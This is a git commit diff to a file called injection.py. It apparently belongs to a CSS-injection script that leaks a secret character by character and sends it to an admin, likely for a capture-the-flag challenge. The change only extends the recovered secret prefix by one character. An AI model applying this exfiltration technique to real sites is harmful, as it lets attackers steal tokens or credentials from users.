d48abea8622a238cc4301069af7af06f409cf101
Coutand <bastien.coutand@netcourrier.com>
2022-04-27 21:27:26 +0200

    update css

--- injection.py
+++ injection.py
@@ -116,7 +116,7 @@ def build_css(chars):
 
 # ----
 chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-know  = "ruW-tjL1BWCdhbiOSCA7=VEsDrT52Hf@" 
+know  = "ruW-tjL1BWCdhbiOSCA7=VEsDrT52Hf@g" 
 
 # envoie à admin 
 while 1:
